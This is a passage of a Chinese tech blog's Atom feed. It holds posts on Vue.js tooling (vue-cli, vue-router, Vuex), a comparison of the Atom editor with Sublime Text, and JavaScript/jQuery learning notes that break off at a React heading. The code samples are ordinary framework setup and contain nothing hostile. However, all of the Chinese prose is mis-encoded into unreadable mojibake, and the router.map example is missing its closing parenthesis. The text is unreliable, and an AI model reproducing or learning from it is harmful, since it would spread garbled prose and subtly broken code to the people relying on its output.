<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘è§‰å¾— <code>Vue.js</code> æ¯” <code>React</code> æ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œæ‰€ä»¥å¾ˆå¿«å°±å­¦ä¼šäº†å®ƒã€‚æƒ³äº†æƒ³ç¡®å®ä¸çŸ¥é“è¯¥æ•´ç†ä¸€äº›ä»€ä¹ˆï¼Œå› ä¸º <a href="http://vuejs.org.cn/guide/" target="_blank" rel="external">Vue çš„å®˜æ–¹æ•™ç¨‹</a>å†™çš„ç¡®å®å¾ˆç›´ç™½æ¸…æ¥šï¼Œæ‰€ä»¥åœ¨æ­¤ä¸å†èµ˜è¿°ï¼Œæœ‰æ—¶é—´çš„è¯å¯èƒ½ä¼šè€ƒè™‘å†™ä¸€ä¸ª Vue çš„æ•™ç¨‹ã€‚</p>
<h1 id="2-vue-cli">2. vue-cli</h1>
<p><a href="https://github.com/vuejs/vue-cli" target="_blank" rel="external">vue-cli</a> æ˜¯ä¸€ä¸ª Vue.js å®˜æ–¹æä¾›çš„è„šæ‰‹æ¶å·¥å…·ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥è½»æ¾åœ°æ„å»ºå‡ºä¸€ä¸ªåº”ç”¨ <code>Vue.js</code> çš„å·¥ç¨‹ã€‚å®˜æ–¹æä¾› 5 ç§æ¨¡æ¿ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨ <code>github</code> ä¸Šæˆ–è€…æœ¬åœ°æ„å»ºè‡ªå·±çš„æ¨¡æ¿ç„¶åä½¿ç”¨ vue-cli ç”Ÿæˆå·¥ç¨‹ã€‚</p>
<p><a href="https://github.com/vuejs/vue-cli#usage" target="_blank" rel="external">å…·ä½“ä½¿ç”¨æ–¹æ³•</a>ï¼šç”Ÿæˆä¸€ä¸ªå·¥ç¨‹æä¸ºç®€å•ï¼Œåªéœ€ä¸€ä¸¤æ¡å‘½ä»¤å³å¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ vue init webpack my-project     // ä½¿ç”¨ webpack æ¨¡æ¿ç”Ÿæˆå·¥ç¨‹ my-project</div><div class="line">$ <span class="built_in">cd</span> my-project</div><div class="line">$ npm install</div><div class="line">$ npm run dev</div></pre></td></tr></table></figure>
<p>ç„¶åï¼Œå€ŸåŠ© <code>webpack</code> ä¸ <code>vue-loader</code>, ä½ å¯ä»¥å°†ä¸€ä¸ª <code>Vue</code> ç»„ä»¶çš„æ¨¡æ¿ã€æ ¸å¿ƒjsä»£ç å’ŒCSSå†™åœ¨<strong>ä¸€ä¸ªæ–‡ä»¶é‡Œ</strong>ï¼Œç”šè‡³è¿˜å¯ä»¥ä½¿ç”¨ <code>CSS</code> ä¸ <code>HTML</code> çš„é¢„å¤„ç†å™¨ï¼Œåƒè¿™æ ·ï¼š<br>
<img src="/pics/vue/vue-component-with-pre-processors.png" alt=""><br>
<span style="font-size: 0.75em;">å›¾ç‰‡æ¥è‡ª<a href="http://vuejs.org.cn/guide/application.html" target="_blank" rel="external"> Vue.js å®˜æ–¹æ•™ç¨‹ - æ„å»ºå¤§å‹åº”ç”¨</a>ã€‚</span></p>
<h1 id="3-vue-router">3. Vue-router</h1>
<p><a href="https://github.com/vuejs/vue-router/" target="_blank" rel="external"><code>vue-router</code></a> æ˜¯ <code>vue</code> å®˜æ–¹æä¾›çš„è·¯ç”±æ¨¡å—ï¼Œå¯ä»¥å®ç° <code>SPA</code> ä¸­çš„è·¯ç”±æ“ä½œã€‚å…·ä½“æ–‡æ¡£çœ‹<a href="http://vuejs.github.io/vue-router/zh-cn/index.html" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚é¡ºä¾¿æä¸€å¥ï¼Œ<code>vue-router</code> çš„ä¸­æ–‡æ–‡æ¡£å·²ç»è¿‡æ—¶äº†ã€‚</p>
<h2 id="31">3.1 åˆå§‹åŒ–</h2>
<p>é¦–å…ˆä½¿ç”¨ <code>npm</code> å®‰è£… <code>vue-router</code>, ç„¶ååœ¨ç¨‹åºå…¥å£ç‚¹é…ç½® <code>vue-router</code>.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></div><div class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">'vue-router'</span></div><div class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./components/App'</span>                    <span class="comment">// ç¨‹åºçš„æ ¸å¿ƒ Vue åº”ç”¨</span></div><div class="line"><span class="keyword">import</span> HomePageView <span class="keyword">from</span> <span class="string">'./components/HomePageView'</span>  <span class="comment">// å¯¼å…¥æ‰€æœ‰çš„ View ç»„ä»¶</span></div><div class="line"><span class="keyword">import</span> ItemView <span class="keyword">from</span> <span class="string">'./components/ItemView'</span></div><div class="line"></div><div class="line">Vue.use(Router)                                       <span class="comment">// Vue é…ç½®</span></div><div class="line"><span class="keyword">var</span> router = <span class="keyword">new</span> Router()                             <span class="comment">// ç”Ÿæˆè·¯ç”±å¯¹è±¡</span></div><div class="line">router.map(&#123;                                          <span class="comment">// é…ç½®è·¯ç”±</span></div><div class="line">  <span class="string">'/'</span>: &#123;</div><div class="line">    <span class="attr">name</span>: <span class="string">'homepage'</span>,</div><div class="line">    <span class="attr">component</span>: HomePageView</div><div class="line">  &#125;,</div><div class="line">  <span class="string">'/home'</span>: &#123;</div><div class="line">    <span class="attr">name</span>: <span class="string">'homepage'</span>,</div><div class="line">    <span class="attr">component</span>: HomePageView</div><div class="line">  &#125;,</div><div class="line">  <span class="string">'/item/:id'</span>: &#123;                                    <span class="comment">// æ”¯æŒåŠ¨æ€è·¯å¾„</span></div><div class="line">    name: <span class="string">'item'</span>,</div><div class="line">    <span class="attr">component</span>: ItemView</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">router.redirect(&#123;                                   <span class="comment">// è®¾ç½®é‡å®šå‘é€‰é¡¹</span></div><div class="line">  <span class="string">'*'</span>: <span class="string">'/home'</span></div><div class="line">&#125;)</div><div class="line"></div><div class="line">router.start(App, <span class="string">'[app]'</span>)                           <span class="comment">// æŒ‚è½½ Vue ä¸»åº”ç”¨</span></div></pre></td></tr></table></figure>
<p>ç„¶ååœ¨ <code>App.vue</code> çš„ template ä¸­è®¾ç½® <code>router-view</code>.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">router-view</span></span></div><div class="line">    <span class="attr">keep-alive</span></div><div class="line">    <span class="attr">transition</span>=<span class="string">"fade"</span></div><div class="line">    <span class="attr">transition-mode</span>=<span class="string">"out-in"</span>&gt;</div><div class="line">  <span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="32-vue-router">3.2 vue-router çš„ä½¿ç”¨</h2>
<p><code>Vue Router</code> å¯¹è±¡è¢«åµŒå…¥åˆ°æ¯ä¸ª <code>vue</code> ç»„ä»¶ä¸­ï¼Œå¯ä»¥åœ¨ç»„ä»¶ä¸­è°ƒç”¨ <code>this.$router</code> æ¥æ§åˆ¶ router å¯¹è±¡ï¼Œå¦‚è¿›è¡Œé¡µé¢è·³è½¬ç­‰ã€‚</p>
<p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥åœ¨é¡µé¢åˆ‡æ¢æ—¶åœ¨ç»„ä»¶çš„ <code>route</code> é…ç½®ä¸­ä½¿ç”¨è·¯ç”±åˆ‡æ¢é’©å­æ§åˆ¶ <code>vue-router</code>ï¼Œè¯¦æƒ…è¯·çœ‹<a href="http://vuejs.github.io/vue-router/zh-cn/pipeline/index.html" target="_blank" rel="external">æ–‡æ¡£</a></p>
<h1 id="4-vuex">4. Vuex</h1>
<p><a href="https://github.com/vuejs/vuex/" target="_blank" rel="external"><code>Vuex</code></a> æ˜¯ä¸€ä¸ªå€Ÿé‰´äº <code>Flux</code>ï¼Œä½†æ˜¯ä¸“é—¨ä¸º <code>Vue.js</code> æ‰€è®¾è®¡çš„çŠ¶æ€ç®¡ç†æ–¹æ¡ˆã€‚<code>Flux</code> é‡‡ç”¨äº† <code>Action â†’ Dispatcher â†’ Store â†’ View</code> çš„çŠ¶æ€ç®¡ç†æœºåˆ¶ï¼Œè€Œ <code>Vuex</code> è·Ÿå®ƒå·®ä¸å¤šï¼šVue ç»„ä»¶è°ƒç”¨ actionï¼Œaction dispatches mutation, mutation æ”¹å˜ store ä¸­çš„ stateï¼Œstate æ”¹å˜ View. ä¸‹é¢æ˜¯ <code>Vuex</code> çš„æ•°æ®æµã€‚</p>
<p><img src="/pics/vue/vuex.png" alt="Vuex Data Flow"></p>
<h2 id="41">4.1 ä½¿ç”¨æ–¹æ³•</h2>
<p>ç¨‹åºå…¥å£ç‚¹ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span></div><div class="line"></div><div class="line">Vue.use(Vuex)</div></pre></td></tr></table></figure>
<p>ä¸»åº”ç”¨ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'../store'</span></div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</div><div class="line">  store,                      <span class="comment">// å¼•ç”¨store</span></div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>å…¶å®ƒç»„ä»¶ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</div><div class="line">  ...,</div><div class="line">  <span class="attr">vuex</span>: &#123;</div><div class="line">    <span class="comment">// å®šä¹‰ getter ä» store ä¸­è·å– state å¹¶æ³¨å†Œè‡³åº”ç”¨ä¸­</span></div><div class="line">    getters: &#123;</div><div class="line">      <span class="attr">logged_in</span>: <span class="function"><span class="keyword">function</span> (<span class="params">state</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> state.user.logged_in</div><div class="line">      &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// å®šä¹‰ action, ç»„ä»¶å¯åœ¨è‡ªå·±çš„å‡½æ•°ä¸­è°ƒç”¨ action æ¥ dispatch mutations.</span></div><div class="line">    actions: &#123;</div><div class="line">      <span class="attr">login</span>: <span class="function">(<span class="params">&#123; dispatch &#125;, user</span>) =&gt;</span> &#123;</div><div class="line">        dispatch(<span class="string">'LOGIN'</span>, user)</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>å…³äº store åŠ mutation çš„å®šä¹‰æ–¹å¼ï¼Œè¯·å‚è€ƒ<a href="http://vuejs.github.io/vuex/en/tutorial.html" target="_blank" rel="external"> Vuex æ–‡æ¡£</a>ã€‚</p>
<h1 id="5">5. æ€»ç»“ &amp; åè®°</h1>
<p>è·Ÿ React ç›¸æ¯”ï¼Œä¸ªäººæ„Ÿè§‰ Vue è¦æ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œæ˜“äºä½¿ç”¨ï¼Œæ–‡æ¡£ä¹Ÿå¾ˆæ¸…æ¥šï¼ˆæ¯” Hexo çš„é«˜åˆ°ä¸çŸ¥é“é‚£é‡Œå»äº†ï¼Œå‰ä¸¤å¤©è¢« Hexo æ•´ç–¯äº†å¿…é¡»è¦é»‘ä¸€ä¸‹å®ƒï¼‰ï¼›Vue çš„ä¸€ç³»åˆ—å·¥å…·ä¹Ÿå¾ˆæ˜“äºä½¿ç”¨ï¼Œä¸ Vue æ•´åˆåº¦é«˜ï¼Œå¯ä»¥åœ¨ç»„ä»¶ä¸­æ–¹ä¾¿åœ°è¿›è¡Œæ“ä½œã€‚</p>
<p>å‰ç«¯è¯¾ç»“è¯¾ï¼Œå‡†å¤‡é€€å‘äº†ï¼Œè¿‡å‡ å¤©å¯èƒ½ä¼šå­¦ä¹ å¹¶æ•´ç†ä¸€äº›åç«¯çš„çŸ¥è¯†ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¹‹å‰çš„é‚£é—¨ JS å’Œå‰ç«¯è¯¾ç»“è¯¾äº†ï¼Œæœ€åèŠ±äº†ä¸€å‘¨æ—¶é—´å†™äº†ä¸€ä¸ª projectï¼Œä½¿ç”¨ Vue.js çš„ä¸€å¥—å·¥å…·å†™äº†ä¸€ä¸ªå•é¡µé¢åº”ç”¨ï¼Œå…ˆå°†ä½¿ç”¨åˆ°åŠå­¦åˆ°çš„çŸ¥è¯†æ¥æ•´ç†ä¸€ä¸‹ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Javascript" scheme="//blog.stdioa.com/categories/Javascript/"/>
    
    
      <category term="Javascript" scheme="//blog.stdioa.com/tags/Javascript/"/>
    
      <category term="node.js" scheme="//blog.stdioa.com/tags/node-js/"/>
    
      <category term="å‰ç«¯å¼€å‘" scheme="//blog.stdioa.com/tags/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
      <category term="vue.js" scheme="//blog.stdioa.com/tags/vue-js/"/>
    
  </entry>
  
  <entry>
    <title>Atom æµ…åº¦ä½“éªŒæ„Ÿå—</title>
    <link href="//blog.stdioa.com/2016/03/essay-atom-using-experience/"/>
    <id>//blog.stdioa.com/2016/03/essay-atom-using-experience/</id>
    <published>2016-03-27T02:40:03.000Z</published>
    <updated>2016-11-08T13:48:35.480Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©çœ‹åˆ°äº† Atom å®˜æ–¹å‘å¸ƒäº†ä¸€ç¯‡ <a href="http://flight-manual.atom.io/" target="_blank" rel="external">Atom Flight Manual</a>, çœ‹äº†ä¸¤é¡µè§‰å¾—æœ‰äº›æ„Ÿå…´è¶£æ‰€ä»¥ä¸‹äº†ä¸€ä¸ªä½“éªŒä¸€ä¸‹ã€‚</p>
<a id="more"></a>
<p>å¾ˆä¹…ä»¥å‰å°±å¬è¯´äº† <code>Atom</code> è¿™æ¬¾ç¼–è¾‘å™¨ï¼ŒGithub å®£ç§°å®ƒæ˜¯&quot;A hackable text editor
for the 21st Century&quot;, æœ‰äº›æ„Ÿå…´è¶£äºæ˜¯å°±æäº†ä¸€ä¸ªå†…æµ‹ç ä¸‹è½½ä¸‹æ¥æ¥ç©äº†ç©ï¼Œä½†æ˜¯ï¼Œå½“æ—¶ Atom çš„ç”¨æˆ·ä½“éªŒå¹¶ä¸å¥½ï¼ŒåŠ ä¸Šå¯ä»¥ä½¿ç”¨çš„æ’ä»¶å°‘ä¹‹åˆå°‘ï¼Œå°±æ”¾å¼ƒäº†å®ƒã€‚æ˜¨å¤©ä»å¾®åšä¸Šçœ‹åˆ°äº†å®˜æ–¹çš„ <a href="http://flight-manual.atom.io/" target="_blank" rel="external">Atom Flight Manual</a>ï¼Œå†³å®šé‡æ–°ä½“éªŒä¸€ä¸‹è¿™æ¬¾æ‰€è°“â€œå±äº 21 ä¸–çºªçš„ç¼–è¾‘å™¨â€ã€‚</p>
<p>å½“ç„¶ï¼Œä½œä¸ºä¸€ä¸ªä½¿ç”¨ Sublime Text å°†è¿‘ 2 å¹´çš„ç”¨æˆ·ï¼Œæˆ‘è‚¯å®šä¼šå°† Atom è·Ÿ Sublime Textï¼ˆä¸‹ç§° STï¼‰è¿›è¡Œæ¯”è¾ƒå’¯ã€‚</p>
<h1 id="1">1. ç¬¬ä¸€å°è±¡</h1>
<p>ä¸€æ‰“å¼€Atomç•Œé¢ï¼Œæ•´ä¸ª UI è¿˜æ˜¯æµ“æµ“çš„ä»¿ ST é£æ ¼ï¼Œå¿«æ·é”®éƒ½åŸºæœ¬ä¸€æ ·ï¼Œå¯èƒ½æ˜¯å› ä¸º ST çš„ UI ç¡®å®å¾ˆç®€æ´æ¼‚äº®å§ã€‚<br>
ä¸è¿‡ ST æ˜¯æ”¶è´¹çš„ï¼ˆæ— æœŸé™è¯„ä¼°ä½¿ç”¨ä¹Ÿæ˜¯æ”¶è´¹ï¼‰ï¼Œè€Œ Atom æ˜¯å…è´¹çš„ï¼Œè¿™ç‚¹è¦èµä¸€ä¸ª~å½“ç„¶è¿™æ ¹æœ¬æ— æ³•æ‰“æ¶ˆæš‘å‡è´­ä¹° ST æˆæƒç çš„å†³å¿ƒã€‚</p>
<h1 id="2">2. å¯åŠ¨é€Ÿåº¦</h1>
<p>Atom çš„å¯åŠ¨é€Ÿåº¦æ˜¾ç„¶è·Ÿ ST æ²¡æ³•æ¯”ã€‚å®æµ‹åœ¨è£…äº† 15 ä¸ªæ’ä»¶ä»¥åï¼ŒAtom çš„å¯åŠ¨é€Ÿåº¦è¦æ¯” ST3 æ…¢ 5 å€å·¦å³ã€‚å½“ç„¶ï¼Œå®ƒçš„å¯åŠ¨é€Ÿåº¦åº”è¯¥ä¼šæ¯”è£…äº†ä¸€å †æ’ä»¶çš„ ST2 å¿«ä¸€ç‚¹â€¦ST2 çš„å¯åŠ¨é€Ÿåº¦è²Œä¼¼æ˜¯å†å²é—ç•™é—®é¢˜äº†ã€‚</p>
<h1 id="3">3. ç”¨æˆ·ä½“éªŒ</h1>
<p>æ„Ÿè§‰ Atom çš„ç”¨æˆ·ä½“éªŒè¦æ¯”ä¸Šæ¬¡å¥½çš„å¤šã€‚</p>
<p>æ¥è¯´ä¸€è¯´æˆ‘çœ‹å¥½ Atom çš„åœ°æ–¹å§ã€‚</p>
<ol>
<li>
<p>Web-Based<br>
Atom ç¼–è¾‘å™¨æ˜¯åŸºäº V8ï¼Œæ•´ä¸ª Atom ç¼–è¾‘é¡µé¢å°±æ˜¯ä¸€ä¸ªç½‘é¡µã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ„Ÿè§‰ç½‘é¡µå¯¹æˆ‘æ¥è¯´æ›´æœ‰äº²åˆ‡æ„ŸğŸ˜³ï¼Œå½“ç„¶è¿™ä¹Ÿä½¿å¾— Atom æ›´åŠ å®¹æ˜“ä¿®æ”¹ï¼Œæ–¹ä¾¿äº†æ’ä»¶çš„å¼€å‘ã€‚</p>
</li>
<li>
<p>Git Diff &amp; Markdown Preview é›†æˆ<br>
Atom è‡ªå¸¦äº†ä¸¤ä¸ªæ’ä»¶ï¼š<code>Git Diff</code> å’Œ <code>Markdown Preview</code>.<br>
<code>Git Diff</code> å¯ä»¥å®æ—¶æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„ Git Diff ä¿¡æ¯ã€‚å—¯é‚£ä¸ª Git Diff è¿˜æ˜¯è›®æ¼‚äº®çš„~<br>
<img src="/pics/atom/git_diff.jpg" alt="Git Diff"><br>
<code>Markdown Preview</code> å¯ä»¥æä¾› Github Markdown å®æ—¶é¢„è§ˆã€‚ç„¶è€Œä½œä¸ºä¸€ä¸ªå¯ä»¥å¯¹ Markdown è¿›è¡Œäººè‚‰ç¼–è¯‘çš„äººï¼Œæ ¹æœ¬ä¸éœ€è¦è¿™æ ·çš„æ’ä»¶å—¯ğŸ˜‚<br>
åŒæ—¶ï¼ŒAtom è¿˜é›†æˆäº† Git çš„å¸¸ç”¨åŠŸèƒ½ï¼Œå¦‚å½“å‰ç›®å½•æ‰€åœ¨ Git åˆ†æ”¯ã€‚è¿™ä¸ªåŠŸèƒ½ä¹Ÿè¦ç‚¹ä¸ªèµã€‚</p>
</li>
<li>
<p>Package/Theme å®‰è£…åŠé…ç½®<br>
è¿™ç‚¹ä¸Š Atom åšçš„è¦æ¯” ST å¥½å¾—å¤šã€‚Atom å¯ä»¥åœ¨çº¿æŸ¥çœ‹ Package çš„ README ä¿¡æ¯ï¼Œæ¯ä¸€ä¸ª Package ä¹Ÿæœ‰å…¶ç‹¬ç«‹çš„é…ç½®é¡µé¢ï¼Œä¸å¿…åƒ ST é‚£æ ·ç›´æ¥å»ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚<br>
<img src="/pics/atom/package_settings.jpg" alt="Package Settings"></p>
<p>å½“ç„¶ï¼ŒAtom è‡ªå¸¦äº†ä¸€ä¸ªå«åš <code>apm</code> çš„åŒ…ç®¡ç†å·¥å…·ï¼Œè¿™ä¸ªå°±ä¸é”™è¯„ä»·å’¯ï¼Œäººå®¶åªæ˜¯æµ…åº¦ä½¿ç”¨å˜›ï¼ˆå‚²å¨‡è„¸</p>
</li>
</ol>
<h1 id="4-hackable">4. Hackable ç®€å•ä½“éªŒâ€”â€”ç¼–è¾‘å™¨å­—ä½“ä¿®æ”¹</h1>
<p>ä¹‹å‰ç”¨ ST çš„æ—¶å€™ä¸ºäº†å°† Consolas å’Œå¾®è½¯é›…é»‘ç»“åˆèµ·æ¥ï¼Œç€å®å¤´ç–¼äº†å¥½ä¹…ï¼Œåˆ°äº† Atom é‡Œï¼Œæ‰“å¼€ Stylesheet é…ç½®æ–‡ä»¶ï¼Œä¸€è¡Œä»£ç æå®šğŸ˜†</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">atom-text-editor</span> &#123;</div><div class="line">  <span class="attribute">font-family</span>: Consolas, <span class="string">"Microsoft Yahei"</span>, sans-serif;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="5">5. æ€»ç»“</h1>
<p>Atom ç¡®å®æ¯”ä»¥å‰å¥½ç”¨äº†å¾ˆå¤šã€‚æˆ‘å¤§æ¦‚ä¸ä¼šå¸è½½å®ƒï¼Œè€Œæ˜¯æŠŠå®ƒç•™åœ¨ç”µè„‘é‡Œï¼Œç­‰åˆ° ST ç”¨è…»äº†å¯ä»¥æ¢æ¢å£å‘³~<br>
ç„¶è€Œå°è¯•äº† Atom å¹¶æ›´æ¢ä¸»é¢˜ã€å®‰è£…äº†å‡ ä¸ªå®ç”¨çš„æ’ä»¶ä»¥åï¼Œæˆ‘è¿˜æ˜¯è·‘åˆ° Sublime é‚£é‡Œå®‰è£…äº†ç±»ä¼¼çš„æ’ä»¶ğŸ˜‚</p>
<p>é…ç½®åçš„ Atom:<br>
<img src="/pics/atom/atom_after.jpg" alt="Atom ä¸ªæ€§åŒ–"><br>
ä½¿ç”¨ Atom å‰çš„ ST:<br>
<img src="/pics/atom/st_before.jpg" alt="ST ä¸ªæ€§åŒ–å‰"><br>
ä½¿ç”¨ Atom åï¼Œå®‰è£…äº†æ’ä»¶<code>Color Highlighter</code>, <code>GitGutter</code> å’Œ <code>SublimeGit</code>çš„ ST:<br>
<img src="/pics/atom/st_after.jpg" alt="ST ä¸ªæ€§åŒ–å"></p>
<p>å¥½å§â€¦æˆ‘æŠŠ ST é…ç½®çš„åƒ Atom äº†ï¼ˆæ‘Šæ‰‹</p>
<p>å®Œã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ˜¨å¤©çœ‹åˆ°äº† Atom å®˜æ–¹å‘å¸ƒäº†ä¸€ç¯‡ &lt;a href=&quot;http://flight-manual.atom.io/&quot;&gt;Atom Flight Manual&lt;/a&gt;, çœ‹äº†ä¸¤é¡µè§‰å¾—æœ‰äº›æ„Ÿå…´è¶£æ‰€ä»¥ä¸‹äº†ä¸€ä¸ªä½“éªŒä¸€ä¸‹ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="éšç¬”" scheme="//blog.stdioa.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Git" scheme="//blog.stdioa.com/tags/Git/"/>
    
      <category term="Atom" scheme="//blog.stdioa.com/tags/Atom/"/>
    
      <category term="Sublime Text" scheme="//blog.stdioa.com/tags/Sublime-Text/"/>
    
      <category term="æ–‡æœ¬ç¼–è¾‘å™¨" scheme="//blog.stdioa.com/tags/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Javascriptå­¦ä¹ æ€»ç»“</title>
    <link href="//blog.stdioa.com/2016/02/learning-javascript/"/>
    <id>//blog.stdioa.com/2016/02/learning-javascript/</id>
    <published>2016-02-24T11:31:42.000Z</published>
    <updated>2016-11-08T13:48:35.510Z</updated>
    
    <content type="html"><![CDATA[<p>ä»å¼€å§‹å†™Javascriptåˆ°ç°åœ¨ï¼Œå·²ç»æœ‰ä¸€ä¸ªæœˆäº†ï¼Œè¿™ä¸€ä¸ªæœˆå­¦äº†ä¸å°‘æ–°å§¿åŠ¿ï¼Œéšä¾¿å†™å†™ï¼Œç®€å•æ•´ç†ä¸€ä¸‹ã€‚</p>
<a id="more"></a>
<h1 id="1-javascript">1. Javascript</h1>
<p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½æ•´ç†çš„â€¦éšä¾¿å†™å‡ æ¡ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a;                          <span class="comment">// é˜²æ­¢å˜é‡ä½œç”¨åŸŸæå‡</span></div><div class="line">    do_something();</div><div class="line">&#125;());</div><div class="line"></div><div class="line">some_list.map(<span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</div><div class="line">        <span class="keyword">this</span>.do_something(obj);</div><div class="line">    &#125;, <span class="keyword">this</span>);                       <span class="comment">// æŠŠthisä¼ åˆ°mapé‡Œé¢çš„åŒ¿åå‡½æ•°ä¸­ï¼Œå¦åˆ™é‡Œé¢çš„thisä¸ºundefined</span></div><div class="line"></div><div class="line">setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;, <span class="number">1000</span>);</div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;, <span class="number">1000</span>);</div></pre></td></tr></table></figure>
<h1 id="2-jquery">2. jQuery</h1>
<h2 id="21">2.1 é€‰æ‹©å™¨</h2>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">"input[type=text]"</span>)   <span class="comment">// é€‰æ‹©å±æ€§</span></div><div class="line">$(<span class="string">"ul&gt;li:eq(3)"</span>)        <span class="comment">// é€‰æ‹©ç¬¬4ä¸ªliå…ƒç´ </span></div><div class="line">$(<span class="string">"ul&gt;li"</span>).eq(<span class="number">3</span>)        <span class="comment">// é€‰æ‹©æ‰€æœ‰"ul&gt;li"ä¸­çš„ç¬¬4ä¸ªå…ƒç´ ï¼ˆæ³¨æ„ä¸ä¸Šé¢é‚£ä¸ªé€‰æ‹©å™¨çš„ä¸åŒï¼‰</span></div><div class="line">$(<span class="string">"ul&gt;li:even"</span>)         <span class="comment">// é€‰æ‹©æ‰€æœ‰å¥‡æ•°liå…ƒç´ ï¼ˆoddåŒç†ï¼‰</span></div></pre></td></tr></table></figure>
<h2 id="22">2.2 æ‚é¡¹</h2>
<p>è·å–è¡¨å•å†…å®¹æ—¶ï¼Œè¦ç”¨<code>$(&quot;...&quot;).val()</code>è€Œä¸æ˜¯<code>$(&quot;...&quot;).text()</code>.</p>
<h1 id="3-nodejs">3. Node.js</h1>
<p>ä¸çŸ¥é“å†™ä»€ä¹ˆï¼Œéšä¾¿å†™å‡ ä¸ªå¥½ç©çš„åº“ï¼š</p>
<ul>
<li><code>cheerio</code>, åœ¨æœåŠ¡å™¨ç«¯è§£æhtmlï¼Œè·ŸjQueryç”¨æ³•å·®ä¸å¤š</li>
<li><code>chalk</code>, è¾“å‡ºå½©è‰²æ–‡å­—</li>
<li><code>gulp</code>, æµå¼è‡ªåŠ¨åŒ–æ„å»ºå·¥å…·ï¼Œåé¢ç»†å†™</li>
</ul>
<h1 id="4-reactjs">4. React.js</h1>
<h2 id="41-jsxbabel">4.1 JSXä¸Babel</h2>
